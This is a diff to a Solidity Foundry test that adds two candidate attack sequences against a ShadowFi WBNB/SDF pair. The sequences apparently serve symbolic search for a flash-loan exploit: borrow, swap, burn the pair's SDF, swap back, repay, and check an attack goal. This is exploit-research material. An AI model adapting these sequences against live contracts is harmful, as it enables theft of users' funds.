@@ -188,6 +188,46 @@ contract ShadowFiTest is Test, BlockLoader {
         pair.sync();
     }
 
+    function check_cand000(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5
+    ) public {
+        vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.assume(amt5 >= (amt0 * 1003) / 1000);
+        borrow_wbnb_owner(amt0);
+        swap_pair_attacker_wbnb_sdf(amt1, amt2);
+        swap_pair_attacker_sdf_wbnb(amt3, amt4);
+        payback_wbnb_owner(amt5);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand001(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6
+    ) public {
+        vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.assume(amt6 >= (amt0 * 1003) / 1000);
+        borrow_wbnb_owner(amt0);
+        swap_pair_attacker_wbnb_sdf(amt1, amt2);
+        burn_sdf_pair(amt3);
+        swap_pair_attacker_sdf_wbnb(amt4, amt5);
+        payback_wbnb_owner(amt6);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
     function test_gt() public {
         vm.startPrank(attacker);
         vm.warp(blockTimestamp);
